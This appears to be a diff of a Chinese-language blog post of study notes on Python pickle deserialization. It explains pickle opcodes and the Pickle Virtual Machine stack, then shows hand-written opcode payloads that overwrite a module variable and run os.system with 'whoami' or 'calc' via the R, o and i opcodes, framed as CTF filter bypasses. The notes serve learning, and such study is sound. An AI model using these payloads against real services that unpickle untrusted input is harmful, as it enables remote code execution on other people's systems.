@@ -45,7 +45,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-05-23T04:51:52.000Z">
-<meta property="article:modified_time" content="2025-05-23T13:15:41.377Z">
+<meta property="article:modified_time" content="2025-10-01T14:09:25.416Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1755671576829),
+    lastupdate: new Date(1766667328040),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2646,7 +2646,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <li><strong>getstate</strong>() ：序列化时调用。</li>
 </ul>
 <p><strong>1.reduce()</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))//必须要有<span class="keyword">return</span></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)//将其注释之后不会弹计算机，但是输出结果不变</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,)) <span class="comment">#必须要有return</span></span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a) <span class="comment">#将其注释之后不会弹计算机，但是输出结果不变</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>执行结果会输出<code>反序列化调用</code>和把电脑上的计算器弹出来，这个代码先对对象进行序列化再进行反序列化</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>
@@ -2660,6 +2660,301 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> <span class="keyword">import</span> os</span><br><span class="line"> <span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">         os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line"> a = A()</span><br><span class="line"> p_a = pickle.dumps(a)</span><br><span class="line"> <span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"> <span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure>
 
 <p>看了Python魔术方法，感觉比php反序列化还容易一点，由于不需要构造pop链</p>
+<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><ul>
+<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
+<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
+<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示，自定义类型。</li>
+<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
+</ul>
+<p>也就是说Pickle是一种Python独有的序列化语言，且可以表示Python几乎所有的类型</p>
+<p>Pickle则是通过将Python代码编写为opcode序列来实现传递对象等操作</p>
+<p>opcode是一个概念，在不同的语言中都不一样，指的是不可拆分的原始指令，感觉和汇编语言差不多</p>
+<p>我们可以通过以下代码查看opencode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;scores&quot;</span>: [<span class="number">85</span>, <span class="number">92</span>, <span class="number">78</span>]&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 序列化</span></span><br><span class="line">serialized = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;原始字节:&quot;</span>, serialized)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反汇编查看opcode</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nOpcode分析:&quot;</span>)</span><br><span class="line">pickletools.dis(serialized)<span class="comment">#用于将opcode转化为肉眼可以读取的形式</span></span><br></pre></td></tr></table></figure>
+
+<p>得到的是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line"> <span class="number">2</span>: \x95 FRAME      <span class="number">35</span></span><br><span class="line"><span class="number">11</span>: &#125;    EMPTY_DICT</span><br><span class="line"><span class="number">12</span>: \x94 MEMOIZE</span><br><span class="line"><span class="number">13</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;name&#x27;</span></span><br><span class="line"><span class="number">19</span>: \x94 MEMOIZE</span><br><span class="line"><span class="number">20</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;Bob&#x27;</span></span><br><span class="line"><span class="number">25</span>: \x94 MEMOIZE</span><br><span class="line"><span class="number">26</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;scores&#x27;</span></span><br><span class="line">...</span><br><span class="line"><span class="number">58</span>: .    STOP</span><br></pre></td></tr></table></figure>
+
+<p>我们可以注意到，就是其他语言的序列化数据都是可以可视字符，只有Python反序列化需要使用不知道是什么编码显示</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04calc\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说通过这些编码来还原出opcode序列然后再还原出Python代码</p>
+<h2 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h2><p>我们在使用pickler的时候，我们要序列化的内容，必须经过PVM，Pickle Virtual Machine (PVM)是Python语言中的一个虚拟机，用于序列化和反序列化Python对象。它是Python标准库中的一部分，由Python的pickle模块提供支持。下面是Pickle Virtual Machine的运行原理：</p>
+<ol>
+<li>生成操作码序列：pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。这些操作码将被保存到文件或网络流中，以便在反序列化时使用。</li>
+<li>反序列化操作码：在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象。它通过Pickle Virtual Machine来执行操作码序列。Virtual Machine会按顺序读取操作码，并根据操作码的类型执行相应的操作。</li>
+<li>执行操作码：<strong>Pickle Virtual Machine支持多种操作码，包括压入常量、调用函数、设置属性等。</strong>执行操作码的过程中，Virtual Machine<strong>会维护一个栈来存储数据。</strong>当执行操作码时，它会将数据从栈中取出，并根据操作码的类型进行相应的操作。执行完成后，结果将被压入栈中。</li>
+<li>构造Python对象：当操作码序列被完全执行后，Pickle Virtual Machine<strong>会将栈顶的数据作为结果返回。这个结果就是反序列化后的Python对象。</strong></li>
+</ol>
+<p>我们可以看到这个和通过<code>__reduce__</code>反序列化进行命令执行不一样</p>
+<p>通过<code>__reduce__</code>魔术方法进行命令执行是通过反序列化生成对象之后执行<code>__reduce__</code>进行代码执行，但是假如对序列化数据中可以使用的魔术方法进行了过滤，我们就不能直接进行代码执行了</p>
+<p>于是我们可以利用在进行反序列化的时候PVM会执行操作码的特性，来写操作码进行命令执行，然后最后反序列化返回的数据不是对象而是我们命令执行的结果</p>
+<h2 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h2><table>
+<thead>
+<tr>
+<th>指令</th>
+<th>描述</th>
+<th>具体写法</th>
+<th>栈上的变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c</td>
+<td>获取一个全局对象或import一个模块</td>
+<td>c[module]\n[instance]\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>o</td>
+<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
+<td>o</td>
+<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>i</td>
+<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
+<td>i[module]\n[callable]\n</td>
+<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
+</tr>
+<tr>
+<td>N</td>
+<td>实例化一个None</td>
+<td>N</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>S</td>
+<td>实例化一个字符串对象</td>
+<td>S’xxx’\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>V</td>
+<td>实例化一个UNICODE字符串对象</td>
+<td>Vxxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>I</td>
+<td>实例化一个int对象</td>
+<td>Ixxx\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>F</td>
+<td>实例化一个float对象</td>
+<td>Fx.x\n</td>
+<td>获得的对象入栈</td>
+</tr>
+<tr>
+<td>R</td>
+<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
+<td>R</td>
+<td>函数和参数出栈，函数的返回值入栈</td>
+</tr>
+<tr>
+<td>.</td>
+<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
+<td>.</td>
+<td>无</td>
+</tr>
+<tr>
+<td>(</td>
+<td>向栈中压入一个MARK标记</td>
+<td>(</td>
+<td>MARK标记入栈</td>
+</tr>
+<tr>
+<td>t</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
+<td>t</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>)</td>
+<td>向栈中直接压入一个空元组</td>
+<td>)</td>
+<td>空元组入栈</td>
+</tr>
+<tr>
+<td>l</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
+<td>l</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>]</td>
+<td>向栈中直接压入一个空列表</td>
+<td>]</td>
+<td>空列表入栈</td>
+</tr>
+<tr>
+<td>d</td>
+<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
+<td>d</td>
+<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
+</tr>
+<tr>
+<td>}</td>
+<td>向栈中直接压入一个空字典</td>
+<td>}</td>
+<td>空字典入栈</td>
+</tr>
+<tr>
+<td>p</td>
+<td>将栈顶对象储存至memo_n</td>
+<td>pn\n</td>
+<td>无</td>
+</tr>
+<tr>
+<td>g</td>
+<td>将memo_n的对象压栈</td>
+<td>gn\n</td>
+<td>对象被压栈</td>
+</tr>
+<tr>
+<td>0</td>
+<td>丢弃栈顶对象</td>
+<td>0</td>
+<td>栈顶对象被丢弃</td>
+</tr>
+<tr>
+<td>b</td>
+<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
+<td>b</td>
+<td>栈上第一个元素出栈</td>
+</tr>
+<tr>
+<td>s</td>
+<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
+<td>s</td>
+<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
+</tr>
+<tr>
+<td>u</td>
+<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
+<td>u</td>
+<td>MARK标记以及被组合的数据出栈，字典被更新</td>
+</tr>
+<tr>
+<td>a</td>
+<td>将栈的第一个元素append到第二个元素(列表)中</td>
+<td>a</td>
+<td>栈顶元素出栈，第二个元素（列表）被更新</td>
+</tr>
+<tr>
+<td>e</td>
+<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
+<td>e</td>
+<td>MARK标记以及被组合的数据出栈，列表被更新</td>
+</tr>
+</tbody></table>
+<p><strong>opcode版本</strong></p>
+<p>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>pickle3版本的opcode示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><strong>利用思路</strong></p>
+<ul>
+<li>任意代码执行或命令执行。</li>
+<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
+</ul>
+<p>我们之前反序化漏洞都是通过魔术方法来实现的，现在不行了，需要绕过，也就是手写opcode进行代码执行</p>
+<h2 id="手写opcode"><a href="#手写opcode" class="headerlink" title="手写opcode"></a>手写opcode</h2><ul>
+<li>在CTF中，很多时候需要一次执行多个函数或一次进行多个指令，此时就不能光用 <code>__reduce__</code> 来解决问题（reduce一次只能执行一个函数，当exec被禁用时，就不能一次执行多条指令了），而需要手动拼接或构造opcode了。手写opcode是pickle反序列化比较难的地方。</li>
+<li>在这里可以体会到为何pickle<strong>是一种语言</strong>，直接编写的opcode灵活性比使用pickle序列化生成的代码更高，只要符合pickle语法，就可以进行变量覆盖、函数执行等操作。</li>
+<li>根据前文不同版本的opcode可以看出，版本0的opcode更方便阅读，所以手动编写时，一般选用版本0的opcode。下文中，所有opcode为版本0的opcode。</li>
+</ul>
+<p><strong>全局变量覆盖</strong></p>
+<p>Python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># secret.py</span></span><br><span class="line">name=<span class="string">&#x27;TEST3213qkfsmfo&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># main.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;1&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;before:&#x27;</span>,secret.name)</span><br><span class="line"></span><br><span class="line">output=pickle.loads(opcode.encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output:&#x27;</span>,output)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;after:&#x27;</span>,secret.name)</span><br></pre></td></tr></table></figure>
+
+<p>首先，通过 <code>c</code> 获取全局变量 <code>secret</code> ，然后建立一个字典，并使用 <code>b</code> 对secret进行属性设置，使用到的payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c__main__  <span class="comment">#c用于从模块中导入一个对象 __main__是模块 secret对象名 然后会把secret压入栈</span></span><br><span class="line">secret</span><br><span class="line">(S<span class="string">&#x27;name&#x27;</span>  <span class="comment">#(设置一个MARK标记 S则往栈中压入一个字符串</span></span><br><span class="line">S<span class="string">&#x27;1&#x27;</span>      <span class="comment"># 在压入一个字符串</span></span><br><span class="line">db.</span><br><span class="line"><span class="comment">#d是用于找到第一个MARK标记，然后按出栈顺序两两组合为字典</span></span><br><span class="line"><span class="comment">#b则是使用栈中第一个元素对的第二个元素进行属性设置</span></span><br><span class="line"><span class="comment">#最后的.是停止符</span></span><br></pre></td></tr></table></figure>
+
+<p>看了一下发现想要学会手写opcode需要我们对栈有深入的了解，但是我只会先进后出，但好像也就是这样</p>
+<p>我们把目光看到最后的一步之前，栈已经不会有再引入了，我们来看下栈的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[ secret, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;1&#x27;</span> ]</span><br><span class="line"><span class="comment">#经过d执行后</span></span><br><span class="line">[ secret, &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125; ]</span><br><span class="line"><span class="comment">#经过b执行 先将&#123;&#x27;name&#x27;:&#x27;1&#x27;&#125;创建成实例，然后再压入secret中然后进行属性设置</span></span><br><span class="line">弹出字典: [ secret ]                栈顶=字典被弹出</span><br><span class="line">弹出类:   [ ]                     栈顶=secret被弹出</span><br><span class="line">创建实例: obj = secret() </span><br><span class="line">更新属性: obj.__dict__ = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">压入实例: [ secret实例 ]</span><br><span class="line">               ↑</span><br><span class="line">              栈顶</span><br></pre></td></tr></table></figure>
+
+<p>于是我们就通过opcode将name属性写入secret对象，这样我们就将secret.py中的name改为了1</p>
+<p><strong>函数执行</strong></p>
+<p>函数执行感觉会很常用到。我们从上一个全局变量覆盖可以看到，opcode执行什么操作主要是取决于最后的一个操作，前面的是准备数据</p>
+<p><code>__reduce__</code>之所以会被过滤的原因是其生成的opcode中在最后会有一个R操作，如果被过滤了的话就无法使用了，现在可以通过opcode进行绕过</p>
+<p>我们执行函数可以利用的操作主要为<code>R，i，o</code>，这些都是可以进行函数执行的操作</p>
+<p>R</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#R的作用是选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</span></span><br><span class="line"><span class="comment">#于是就直接将system作为函数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>o</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#o寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>i</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#注意这里使用的是先引入whoami字符串然后进行i操作</span></span><br><span class="line"><span class="comment">#i相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><strong>实例化对象</strong></p>
+<p>实例化对象是一种特殊的函数执行，这里简单的使用 <code>R</code> 构造一下，其他方式类似：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Student</span></span><br><span class="line"><span class="string">(S&#x27;XiaoMing&#x27;</span></span><br><span class="line"><span class="string">S&quot;20&quot;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">a=pickle.loads(data)</span><br><span class="line"><span class="built_in">print</span>(a.name,a.age)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
